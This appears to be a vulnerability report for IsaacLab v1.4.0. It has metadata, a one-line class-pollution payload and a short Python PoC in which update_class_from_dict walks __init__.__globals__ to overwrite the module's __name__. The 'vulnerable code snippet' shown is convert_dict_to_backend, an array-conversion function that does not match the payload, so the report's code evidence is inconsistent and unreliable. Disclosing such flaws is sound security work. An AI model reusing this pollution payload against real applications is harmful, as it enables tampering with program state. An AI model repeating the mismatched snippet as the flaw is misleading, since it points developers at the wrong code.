## IssacLab

### Meta

+ Library: IssacLab
+ Stars: 2.5K
+ Version: v1.4.0
+ CVE: N/A
+ Status: Pending
+ Payload: ```omni.isaac.lab.utils.dict.update_class_from_dict(obj, {'__init__':{'__globals__':{'__name__':"polluted"}}})```
+ Foundby: BlackPyrl
+ Report: Pending

### Library

https://github.com/isaac-sim/IsaacLab

### Vulnerable Code Snippet

```
def convert_dict_to_backend(
    data: dict, backend: str = "numpy", array_types: Iterable[str] = ("numpy", "torch", "warp")
) -> dict:
    """Convert all arrays or tensors in a dictionary to a given backend.

    This function iterates over the dictionary, converts all arrays or tensors with the given types to
    the desired backend, and stores them in a new dictionary. It also works with nested dictionaries.

    Currently supported backends are "numpy", "torch", and "warp".

    Note:
        This function only converts arrays or tensors. Other types of data are left unchanged. Mutable types
        (e.g. lists) are referenced by the new dictionary, so they are not copied.

    Args:
        data: An input dict containing array or tensor data as values.
        backend: The backend ("numpy", "torch", "warp") to which arrays in this dict should be converted.
            Defaults to "numpy".
        array_types: A list containing the types of arrays that should be converted to
            the desired backend. Defaults to ("numpy", "torch", "warp").

    Raises:
        ValueError: If the specified ``backend`` or ``array_types`` are unknown, i.e. not in the list of supported
            backends ("numpy", "torch", "warp").

    Returns:
        The updated dict with the data converted to the desired backend.
    """
    # THINK: Should we also support converting to a specific device, e.g. "cuda:0"?
    # Check the backend is valid.
    if backend not in TENSOR_TYPE_CONVERSIONS:
        raise ValueError(f"Unknown backend '{backend}'. Supported backends are 'numpy', 'torch', and 'warp'.")
    # Define the conversion functions for each backend.
    tensor_type_conversions = TENSOR_TYPE_CONVERSIONS[backend]

    # Parse the array types and convert them to the corresponding types: "numpy" -> np.ndarray, etc.
    parsed_types = list()
    for t in array_types:
        # Check type is valid.
        if t not in TENSOR_TYPES:
            raise ValueError(f"Unknown array type: '{t}'. Supported array types are 'numpy', 'torch', and 'warp'.")
        # Exclude types that match the backend, since we do not need to convert these.
        if t == backend:
            continue
        # Convert the string types to the corresponding types.
        parsed_types.append(TENSOR_TYPES[t])

    # Convert the data to the desired backend.
    output_dict = dict()
    for key, value in data.items():
        # Obtain the data type of the current value.
        data_type = type(value)
        # -- arrays
        if data_type in parsed_types:
            # check if we have a known conversion.
            if data_type not in tensor_type_conversions:
                raise ValueError(f"No registered conversion for data type: {data_type} to {backend}!")
            # convert the data to the desired backend.
            output_dict[key] = tensor_type_conversions[data_type](value)
        # -- nested dictionaries
        elif isinstance(data[key], dict):
            output_dict[key] = convert_dict_to_backend(value)
        # -- everything else
        else:
            output_dict[key] = value

    return output_dict
```
### PoC

```
from dict import update_class_from_dict

class Animal:
  def __init__(self, typ, age):
      self.type = typ
      self.age = age

obj = Animal('cat', 11)

update_class_from_dict(obj, {
   '__init__': {
        '__globals__': {
            '__name__': 'polluted'
        }
   }
})

print(__name__)
```